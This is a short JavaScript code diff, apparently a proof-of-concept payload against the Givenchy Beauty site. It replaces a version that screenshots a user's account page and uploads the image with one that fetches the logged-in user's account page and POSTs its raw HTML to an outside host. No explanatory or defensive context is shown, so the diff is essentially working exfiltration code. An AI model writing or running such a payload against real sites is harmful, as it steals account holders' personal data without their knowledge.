@@ -19,14 +19,12 @@ function pushScreenshotToServer(dataURL) {
   });
 }
 
-fetch("https://www.givenchybeauty.com/gb/account")
-  .then((a) => a.text())
-  .then((a) => {
-    document.body.innerHTML = a;
-    var screenshotTarget = document.body;
-    html2canvas(screenshotTarget).then((canvas) => {
-      document.body.appendChild(canvas);
-      dataURL = canvas.toDataURL();
-      pushScreenshotToServer(dataURL);
-    });
-  });
+fetch("https://www.givenchybeauty.com/gb/account").then(a => a.text()).then(a => {
+$.ajax({
+    url: "https://[HOST]/givenchy",
+    type: "POST",
+    data: {
+            data: a
+    },
+});
+});
